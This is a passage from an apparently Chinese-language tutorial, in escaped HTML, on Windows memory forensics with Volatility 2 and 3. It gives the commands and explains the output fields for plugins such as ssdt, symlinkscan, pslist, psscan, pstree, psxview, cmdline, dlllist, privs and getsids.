&lt;li&gt;&lt;code&gt;KeBugCheckCallbackListHead&lt;/code&gt;: 当系统发生蓝屏崩溃时触发&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Callback&lt;/code&gt;：回调函数地址&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Module&lt;/code&gt;：所属模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它指明了这个回调函数属于哪个内核模块，即驱动程序&lt;/p&gt;
&lt;p&gt;在正常情况下，这里应该都是&lt;code&gt;ntoskrnl&lt;/code&gt;（内核自身）或已知的、合法的硬件驱动程序（如&lt;code&gt;tcpip&lt;/code&gt;,&lt;code&gt;ndis&lt;/code&gt;等）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Symbol&lt;/code&gt;：回调函数的具体名称&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Detail&lt;/code&gt;：补充说明&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看系统调用ssdt&#34;&gt;查看系统调用（ssdt）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-6&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; ssdt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718102449369.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718102449369&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Entry&lt;/code&gt;&lt;/strong&gt;：SSDT 表中的索引号（入口点编号），以十六进制表示&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Address&lt;/code&gt;&lt;/strong&gt;：该索引号对应的内核函数在内存中的实际地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;owned by&lt;/code&gt;&lt;/strong&gt;：指明了这个函数地址属于哪个内核模块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果一个函数的Owner不是 &lt;code&gt;ntoskrnl.exe&lt;/code&gt;或&lt;code&gt;win32k.sys&lt;/code&gt;，而是另一个可疑的驱动，或者显示为 &lt;code&gt;(unknown)&lt;/code&gt;，就意味着该函数很可能已被挂钩（Hook），指向了恶意的函数&lt;/p&gt;
&lt;h4 id=&#34;volatility3-6&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.ssdt.SSDT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718103947530.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718103947530&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Index&lt;/code&gt;&lt;/strong&gt;：SSDT 表中的索引号（入口点编号）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Address&lt;/code&gt;&lt;/strong&gt;：该索引号对应的内核函数在内存中的实际地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Module&lt;/code&gt;&lt;/strong&gt;：指明了这个函数地址属于哪个内核模块&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Symbol&lt;/code&gt;&lt;/strong&gt;：该内核函数的具体名称&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看符号链接symlinkscan&#34;&gt;查看符号链接（symlinkscan）
&lt;/h3&gt;&lt;p&gt;通过扫描内存以寻找并打印出&lt;code&gt;_OBJECT_SYMBOLIC_LINK&lt;/code&gt;结构，列出系统内核中存在的符号链接及其指向的目标&lt;/p&gt;
&lt;h4 id=&#34;volatility2-7&#34;&gt;Volatility2
&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile=&amp;lt;配置文件&amp;gt; symlinkscan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718174120289.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718174120289&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;输出字段详解&#34;&gt;输出字段详解
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset(P)&lt;/code&gt;&lt;/strong&gt;：该符号链接对象（&lt;code&gt;_OBJECT_SYMBOLIC_LINK&lt;/code&gt; 结构）在内存中的物理地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Ptr&lt;/code&gt;&lt;/strong&gt;：指向该符号链接对象的指针数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Hnd&lt;/code&gt;&lt;/strong&gt;：该符号链接对象的句柄数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Creation time&lt;/code&gt;&lt;/strong&gt;：该符号链接被创建的时间戳（以UTC标准时间显示）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;From&lt;/code&gt;&lt;/strong&gt;：这是符号链接自身的名称，可以理解为“快捷方式”的名字&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;To&lt;/code&gt;&lt;/strong&gt;：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-7&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.symlinkscan.SymlinkScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718175036375.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250718175036375&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset&lt;/code&gt;&lt;/strong&gt;：该符号链接对象（&lt;code&gt;_OBJECT_SYMBOLIC_LINK&lt;/code&gt; 结构）在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CreateTime&lt;/code&gt;&lt;/strong&gt;：该符号链接被创建的时间戳（以UTC标准时间显示）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;From Name&lt;/code&gt;&lt;/strong&gt;：这是符号链接自身的名称，可以理解为“快捷方式”的名字&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;To Name&lt;/code&gt;&lt;/strong&gt;：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程分析&#34;&gt;进程分析
&lt;/h2&gt;&lt;h3 id=&#34;查看进程列表pslistpsscan&#34;&gt;查看进程列表（pslist/psscan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-8&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;仅查看显式进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; pslist 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看包括隐藏进程在内的进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; psscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713121935145.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250713121935145&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Offset(V)&lt;/strong&gt;：进程对象在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;：进程的映像文件名（通常是&lt;code&gt;.exe&lt;/code&gt;文件名）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PID&lt;/strong&gt;：进程ID，每个进程唯一的身份编号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PPID&lt;/strong&gt;：父进程ID，即启动这个进程的那个进程的ID&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Thds&lt;/strong&gt;：线程数，该进程拥有的线程数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hnds&lt;/strong&gt;：句柄数，该进程打开的句柄数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Sess&lt;/strong&gt;：会话ID，用于区分不同的用户登录会话&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Wow64&lt;/strong&gt;：如果为 &lt;code&gt;True&lt;/code&gt;，表示一个32位进程运行在64位系统上&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Start&lt;/strong&gt;：进程的创建时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exit&lt;/strong&gt;：进程的退出时间（如果进程已终止）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-8&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;仅查看显式进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.pslist.PsList	
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看包括隐藏进程在内的进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.psscan.PsScan	
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713113512320.png&#34; alt=&#34;image-20250713113512320&#34; style=&#34;zoom：80%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PID&lt;/strong&gt;：进程ID&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PPID&lt;/strong&gt;：父进程ID，即启动这个进程的那个进程的ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ImageFileName&lt;/strong&gt;：进程的映像文件名，通常是&lt;code&gt;.exe&lt;/code&gt;文件名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Offset(V)&lt;/strong&gt;：进程对象在内存中的虚拟地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Threads&lt;/strong&gt;：线程数，该进程拥有的线程数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Handles&lt;/strong&gt;：句柄数，该进程打开的句柄数量&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SessionID&lt;/strong&gt;：会话ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Wow64&lt;/strong&gt;：如果为 &lt;code&gt;True&lt;/code&gt;，表示一个32位进程运行在64位系统上&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CreatTime&lt;/strong&gt;：进程的创建时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;ExitTime&lt;/strong&gt;：如果进程已终止，显示进程的退出时间&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;File output：是否已经被导出（dump）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看进程父子关系pstree&#34;&gt;查看进程父子关系（pstree）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-9&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; pstree
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706184310572.png&#34; alt=&#34;image-20250706184310572&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;区分父子进程&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;wininit.exe&lt;/strong&gt;：行首没有点，它是这个分支的顶级进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;services.exe&lt;/strong&gt;：行首有 &lt;strong&gt;1个点&lt;/strong&gt;，它位于 &lt;code&gt;wininit.exe&lt;/code&gt;（0个点）的下方，所以 &lt;code&gt;services.exe&lt;/code&gt; 是 &lt;code&gt;wininit.exe&lt;/code&gt; 的子进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCPSVCS.EXE&lt;/strong&gt;：行首有 &lt;strong&gt;2个点&lt;/strong&gt;，它位于 &lt;code&gt;services.exe&lt;/code&gt;（1个点）的下方，所以 &lt;code&gt;TCPSVCS.EXE&lt;/code&gt; 是 &lt;code&gt;services.exe&lt;/code&gt; 的子进程&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当一个进程的父进程ID（PPID）比它自身的进程ID（PID）还要大时，很可能有问题&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-9&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 vol.py -f &amp;lt;内存镜像&amp;gt; windows.pstree.PsTree
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713122632330.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250713122632330&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;与volatility2不同，3使用&lt;code&gt;*&lt;/code&gt;来区分父子进程，&lt;code&gt;*&lt;/code&gt;越多，代表进程的层级越深，是更深层的子进程&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Path&lt;/strong&gt;：每个进程可执行文件在硬盘上的完整路径&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cmd&lt;/strong&gt;：启动该进程时使用的完整命令行参数&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;发现隐藏进程psxview&#34;&gt;发现隐藏进程（psxview）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;恶意进程一般会隐藏自身，而人工对比pslist和psscan又太麻烦太不可靠&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以使用psxview对比各个扫描方式，寻找隐藏进程&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-10&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; psxview
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706223744048.png&#34; alt=&#34;image-20250706223744048&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;过滤带有false的项目，可以很快看出哪些进程隐藏了自身（主要看第一个pslist和第二个psscan）：&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706223629735.png&#34; alt=&#34;image-20250706223629735&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;h4 id=&#34;volatility3-10&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 vol.py -f &amp;lt;内存镜像&amp;gt; windows.malware.psxview.PsXView
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713130244162.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250713130244162&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;过滤False项：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713131252462.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250713131252462&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看进程启动参数cmdline&#34;&gt;查看进程启动参数（cmdline）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;能看到进程如何被创建的，包括命令行启动和exe文件点击启动&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但看不到进程内部的交互，不知道进程干了什么&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-11&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; cmdline
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704132409379.png&#34; alt=&#34;image-20250704132409379&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;h4 id=&#34;volatility3-11&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.cmdline.CmdLine
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713205930999.png&#34; alt=&#34;image-20250713205930999&#34; style=&#34;zoom：67%;&#34; /&gt;
&lt;h3 id=&#34;查看进程加载的dlldlllist&#34;&gt;查看进程加载的DLL（dlllist）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-12&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; dlllist -p 进程pid
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713210521338.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250713210521338&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-12&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.dlllist.DllList --pid 进程pid
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;相较于vol2，vol3还给出了dll的加载时间&lt;code&gt;LoadTime&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713210420002.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250713210420002&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看进程权限privs&#34;&gt;查看进程权限（privs）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-13&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; privs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714095647063.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714095647063&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-13&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.privileges.Privs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714094913789.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714094913789&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看进程对应用户sidgetsids&#34;&gt;查看进程对应用户SID（getsids）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-14&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; getsids
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716110818864.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250716110818864&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-14&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.getsids.GetSIDs 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250716110351479.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250716110351479&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;相较于Volatility2，这个输出更加规范化：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PID&lt;/strong&gt;：进程ID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Process&lt;/strong&gt;：进程名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;SID&lt;/code&gt;&lt;/strong&gt;：安全标识符的字符串表示&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
